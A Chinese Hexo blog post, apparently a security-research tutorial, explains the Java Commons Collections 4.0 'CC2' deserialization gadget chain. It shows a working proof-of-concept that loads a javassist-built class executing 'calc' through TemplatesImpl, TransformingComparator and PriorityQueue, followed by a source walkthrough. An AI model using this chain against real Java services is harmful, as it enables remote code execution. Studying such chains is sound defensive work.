@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="CC1链在实际利用过程存在一些限制，例如jdk8u71版本已经无法利用反序列化漏洞了，通过分析发现jdk8u71版本中改写了sun.reflect.annotation.AnnotationInvocationHandler类的readObject方法，CC1链在jdk8u71版本以上已经被修复了，因此jdk8u71版本重新构造了一条新的利用链（CC2链） 不过CC2链使用了apache comm">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java_cc链2">
+<meta property="og:url" content="http://example.com/2023/07/14/java-cc%E9%93%BE2/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="CC1链在实际利用过程存在一些限制，例如jdk8u71版本已经无法利用反序列化漏洞了，通过分析发现jdk8u71版本中改写了sun.reflect.annotation.AnnotationInvocationHandler类的readObject方法，CC1链在jdk8u71版本以上已经被修复了，因此jdk8u71版本重新构造了一条新的利用链（CC2链） 不过CC2链使用了apache comm">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/cc21.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021071914501957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1NzMzNzUx,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2023-07-14T03:19:38.000Z">
+<meta property="article:modified_time" content="2025-05-25T03:45:41.357Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ilikeoyt.github.io/image/cc21.png">
+
+<link rel="canonical" href="http://example.com/2023/07/14/java-cc%E9%93%BE2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>java_cc链2 | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/14/java-cc%E9%93%BE2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          java_cc链2
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-07-14 11:19:38" itemprop="dateCreated datePublished" datetime="2023-07-14T11:19:38+08:00">2023-07-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-05-25 11:45:41" itemprop="dateModified" datetime="2025-05-25T11:45:41+08:00">2025-05-25</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>CC1链在实际利用过程存在一些限制，例如jdk8u71版本已经无法利用反序列化漏洞了，通过分析发现jdk8u71版本中改写了sun.reflect.annotation.AnnotationInvocationHandler类的readObject方法，CC1链在jdk8u71版本以上已经被修复了，因此jdk8u71版本重新构造了一条新的利用链（CC2链）</p>
+<p>不过CC2链使用了apache commons collections组件4.0版本来进行构造，并没有使用3.1版本，首先 CommonsCollections3 中无法使用，因为其 TransformingComparator 无法序列化。其次只有 CommonsCollections4-4.0 可以使用，因为 CommonsCollections4 其他版本去掉了 InvokerTransformer 的 Serializable 继承，导致无法序列化。</p>
+<span id="more"></span>
+
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
+<li>jdk8u71</li>
+<li>apache commons collection-4.0</li>
+</ul>
+<h2 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-&gt;PriorityQueue.readObject()</span><br><span class="line">      -&gt;PriorityQueue.heapify()</span><br><span class="line">          -&gt;PriorityQueue.siftDown()</span><br><span class="line">            -&gt;PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                -&gt;TransformingComparator.compare()</span><br><span class="line">                    -&gt;InvokerTransformer.transform()</span><br><span class="line">                        -&gt;TemplatesImpl.newTransformer()</span><br><span class="line">                        	-&gt;TemplatesImpl.getTransletInstance()</span><br><span class="line">                        		-&gt;TemplatesImpl.defineTransletClasses()</span><br><span class="line">                        			-&gt;TestTemplatesImpl.newInstance()</span><br></pre></td></tr></table></figure>
+
+<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul>
+<li>并没有使用反序列漏洞</li>
+<li>使用了动态字节码编程来构造poc</li>
+</ul>
+<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>构造的恶意类TestTemplatesImpl</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">package com.cc;</span><br><span class="line"> </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"> </span><br><span class="line">public class TestTemplatesImpl extends AbstractTranslet &#123;</span><br><span class="line"> </span><br><span class="line">    public TestTemplatesImpl() &#123;</span><br><span class="line">        super();</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>该类一旦被实例化即可执行命令</p>
+<p><img src="https://ilikeoyt.github.io/image/cc21.png" alt="img"></p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">package com.cc;</span><br><span class="line"> </span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import javassist.CtClass;</span><br><span class="line">import org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line">import org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"> </span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"> </span><br><span class="line">public class CC2Test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        //构造恶意类TestTemplatesImpl并转换为字节码</span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">        CtClass ctClass = classPool.getCtClass(&quot;com.cc.TestTemplatesImpl&quot;);</span><br><span class="line">        byte[] bytes = ctClass.toBytecode();</span><br><span class="line"> </span><br><span class="line">        //反射创建TemplatesImpl</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;);</span><br><span class="line">        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(new Class[]&#123;&#125;);</span><br><span class="line">        Object TemplatesImpl_instance = constructor.newInstance();</span><br><span class="line">        //将恶意类的字节码设置给_bytecodes属性</span><br><span class="line">        Field bytecodes = aClass.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">        bytecodes.setAccessible(true);</span><br><span class="line">        bytecodes.set(TemplatesImpl_instance , new byte[][]&#123;bytes&#125;);</span><br><span class="line">        //设置属性_name为恶意类名</span><br><span class="line">        Field name = aClass.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">        name.setAccessible(true);</span><br><span class="line">        name.set(TemplatesImpl_instance , &quot;TestTemplatesImpl&quot;);</span><br><span class="line"> </span><br><span class="line">        //构造利用链</span><br><span class="line">        InvokerTransformer transformer=new InvokerTransformer(&quot;newTransformer&quot;,null,null);</span><br><span class="line">        TransformingComparator transformer_comparator =new TransformingComparator(transformer);</span><br><span class="line">        //触发漏洞</span><br><span class="line">        PriorityQueue queue = new PriorityQueue(2);</span><br><span class="line">        queue.add(1);</span><br><span class="line">        queue.add(1);</span><br><span class="line"> </span><br><span class="line">        //设置comparator属性</span><br><span class="line">        Field field=queue.getClass().getDeclaredField(&quot;comparator&quot;);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(queue,transformer_comparator);</span><br><span class="line"> </span><br><span class="line">        //设置queue属性</span><br><span class="line">        field=queue.getClass().getDeclaredField(&quot;queue&quot;);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        //队列至少需要2个元素</span><br><span class="line">        Object[] objects = new Object[]&#123;TemplatesImpl_instance , TemplatesImpl_instance&#125;;</span><br><span class="line">        field.set(queue,objects);</span><br><span class="line">        </span><br><span class="line">        //序列化 ---&gt; 反序列化</span><br><span class="line">        ByteArrayOutputStream barr = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object object = ois.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>cc2链利用流程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 构造一个TestTemplatesImpl恶意类转成字节码，然后通过反射将恶意类的字节码注入到TemplatesImpl对象的_bytecodes属性（构造利用核心代码）</span><br><span class="line"></span><br><span class="line">2. 创建一个InvokerTransformer并传递一个newTransformer方法，然后将InvokerTransformer方法名传递给TransformingComparator（这一步和CC1链非常相似）</span><br><span class="line"></span><br><span class="line">3. 通过反射构造PriorityQueue队列的comparator和queue两个字段，将PriorityQueue队列的comparator字段设置为TransformingComparator，然后将queue字段设置为TemplatesImpl对象，触发利用链</span><br></pre></td></tr></table></figure>
+
+<p>了解CC2链的利用流程后，来分析CC2链是如何构造出来的，为什么要这样构造利用链，先来看核心利用代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//构造恶意类TestTemplatesImpl并转换为字节码</span><br><span class="line">ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">CtClass ctClass = classPool.getCtClass(&quot;com.cc.TestTemplatesImpl&quot;);</span><br><span class="line">byte[] bytes = ctClass.toBytecode();</span><br></pre></td></tr></table></figure>
+
+<p>在构造核心利用代码的时候，是通过javassist动态构造了一个恶意类并将该类转换为二进制字节码，为什么要这么做？因为在构造核心利用代码的时候需要用到TemplatesImpl类。</p>
+<p>TemplatesImpl类有一个_bytecodes属性和一个defineTransletClasses方法，_bytecodes属性会接收一个byte数组，并且defineTransletClasses方法内部调用了defineClass 方法将_bytecodes属性的字节码还原成class对象，然后将class对象赋给_class属性。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">for(int i = 0; i &lt; classCount; ++i) &#123;</span><br><span class="line">                    this._class[i] = loader.defineClass(this._bytecodes[i]);</span><br><span class="line">                    Class superClass = this._class[i].getSuperclass();</span><br><span class="line">                    if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                        this._transletIndex = i;</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        this._auxClasses.put(this._class[i].getName(), this._class[i]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果将一个恶意类传给TemplatesImpl类_bytecodes属性，那么defineTransletClasses方法根据_bytecodes属性的字节码数据加载成class对象时，_bytecodes属性可控，再调用newInstance方法实例化对象就会触发class对象的构造方法了。</p>
+<p>思考一下：如何构造一个恶意类传递给TemplatesImpl类_bytecodes属性？</p>
+<p>可以通过javassist字节码编程动态构造一个恶意类并转换为字节码，然后暴力反射获取TemplatesImpl类的_bytecodes属性并将恶意类的字节码设置给_bytecodes属性。接着还需要找到一个既调用了defineTransletClasses方法，又调用了newInstance方法的地方。</p>
+<p>按Alt + F7快捷键查找，看到TemplatesImpl类中有以下几个方法中调用了defineTransletClasses方法。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">private Translet getTransletInstance() throws TransformerConfigurationException &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        //_name是否为空</span><br><span class="line">        if (_name == null) return null;</span><br><span class="line">        //class对象是否为空</span><br><span class="line">        if (_class == null) defineTransletClasses();</span><br><span class="line"> </span><br><span class="line">        // The translet needs to keep a reference to all its auxiliary</span><br><span class="line">        // class to prevent the GC from collecting them</span><br><span class="line">        //根据class对象实例化</span><br><span class="line">        AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">        translet.postInitialization();</span><br><span class="line">        translet.setTemplates(this);</span><br><span class="line">        translet.setOverrideDefaultParser(_overrideDefaultParser);</span><br><span class="line">        translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">        if (_auxClasses != null) &#123;</span><br><span class="line">            translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        return translet;</span><br><span class="line">    &#125;</span><br><span class="line">    catch (InstantiationException e) &#123;</span><br><span class="line">        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        throw new TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    catch (IllegalAccessException e) &#123;</span><br><span class="line">        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        throw new TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>getTransletInstance方法内部判断了_name属性是否为空，如果为空直接返回null，不再往下执行，这里我们要想办法绕过_name属性，也就是在构造核心利用代码时通过反射将_name属性设置为恶意类TestTemplatesImpl的类名。接着判断class对象为空就调用defineTransletClasses方法创建class对象。当defineTransletClasses方法创建恶意类的class对象后，_class属性会调用newInstance方法实例化TestTemplatesImpl</p>
+<p>具体参考defineTransletClasses方法实现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">private void defineTransletClasses() throws TransformerConfigurationException &#123;</span><br><span class="line">    //_bytecodes属性是否为空</span><br><span class="line">    if (_bytecodes == null) &#123;</span><br><span class="line">        ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">        throw new TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    //获取类加载器</span><br><span class="line">    TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">        AccessController.doPrivileged(new PrivilegedAction() &#123;</span><br><span class="line">            public Object run() &#123;</span><br><span class="line">                return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">    try &#123;</span><br><span class="line">        //统计_bytecodes属性数组</span><br><span class="line">        final int classCount = _bytecodes.length;</span><br><span class="line">        _class = new Class[classCount];</span><br><span class="line"> </span><br><span class="line">        if (classCount &gt; 1) &#123;</span><br><span class="line">            _auxClasses = new HashMap&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">        //根据_bytecodes数组换成class对象</span><br><span class="line">        for (int i = 0; i &lt; classCount; i++) &#123;</span><br><span class="line">             //还原成class对象</span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">            //是否继承了AbstractTranslet类</span><br><span class="line">            final Class superClass = _class[i].getSuperclass();</span><br><span class="line"> </span><br><span class="line">            // Check if this is the main class</span><br><span class="line">            //如果继承了，设置当前class对象的索引下标</span><br><span class="line">            if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                _transletIndex = i;</span><br><span class="line">            &#125;</span><br><span class="line">            else &#123;</span><br><span class="line">                _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        //如果class对象个数为零，抛出异常</span><br><span class="line">        if (_transletIndex &lt; 0) &#123;</span><br><span class="line">            ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">            throw new TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    catch (ClassFormatError e) &#123;</span><br><span class="line">        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">        throw new TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    catch (LinkageError e) &#123;</span><br><span class="line">        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        throw new TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">_class属性是一个接收class对象的数组，_transletIndex索引控制了_class数组中具体的哪一个class对象，defineTransletClasses方法在还原class对象的时候，会判断当前class对象是否继承了AbstractTranslet类并设置_transletIndex索引。</span><br></pre></td></tr></table></figure>
+
+<p>如果在构造TestTemplatesImpl类的时候没有继承AbstractTranslet类的话，_transletIndex索引的值默认为-1，那么getTransletInstance方法中_class属性调用newInstance方法实例化TestTemplatesImpl类的时候就会失败，因此构造TestTemplatesImpl类必须要继承AbstractTranslet类。到这一步核心利用代码算是构造完毕，下一步就需要构造利用链来调用核心利用代码。</p>
+<p>因此构造利用链的思路就是继续寻找哪个地方调用了getTransletInstance方法，按Alt + F7寻找getTransletInstance方法的调用位置，最终我们找到TemplatesImpl类中有一个newTransformer方法内部调用了getTransletInstance方法。</p>
+<p>我们来分析一下<strong>newTransformer方法</strong>是干嘛用的，看能不能在这个方法找到构造利用链的思路：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   public synchronized Transformer newTransformer() throws TransformerConfigurationException &#123;</span><br><span class="line">	TransformerImpl transformer;</span><br><span class="line"> </span><br><span class="line">	transformer = new TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">		_indentNumber, _tfactory);</span><br><span class="line"> </span><br><span class="line">	if (_uriResolver != null) &#123;</span><br><span class="line">		transformer.setURIResolver(_uriResolver);</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">		transformer.setSecureProcessing(true);</span><br><span class="line">	&#125;</span><br><span class="line">	return transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>newTransformer方法的作用是返回一个Transformer，是不是很眼熟，这跟CC1链中构造transformer数组的思路有些类似，那么我们可以从之前的CC1链中寻找思路。InvokerTransformer类中有一个transform方法会根据传入的iMethodName，iParamTypes，iArgs这三个成员属性来执行class对象的某个方法，并且这三个属性是根据InvokerTransformer类的构造传入的，然后通过InvokerTransformer类的transform方法来调用newTransformer方法。</p>
+<p>接下来我们要做的就是想方设法如何去调用newTransformer方法，因此构造利用链的思路就是：分析哪些类中的transform方法调用了newTransformer方法？</p>
+<p>通过进一步分析发现InvokerTransformer类中的transform方法是通过实现Transformer接口来的，因此下一步的思路就是查找哪些类调用了Transformer接口的transform方法并且还实现了Serializable接口，最终我们找到以下这几个类：</p>
+<p>找到了很多类中都调用了transform方法，不过这里我们用到的是TransformingComparator类（大家可以自己去分析一下其他类是否可以构造利用链），TransformingComparator类是一个Comparable 对象的comparator比较器，实现了Serializable接口。</p>
+<p>TransformingComparator类的compare方法中通过transformer属性来调用transform方法的，如果想要调用InvokerTransformer类的transform方法，可以把InvokerTransformer传给TransformingComparator类的构造来设置transformer属性（当然也可以使用反射），因为transformer属性可控。</p>
+<p>TransformingComparator类的compare方法中通过transformer属性来调用transform方法的，如果想要调用InvokerTransformer类的transform方法，可以把InvokerTransformer传给TransformingComparator类的构造来设置transformer属性（当然也可以使用反射），因为transformer属性可控。</p>
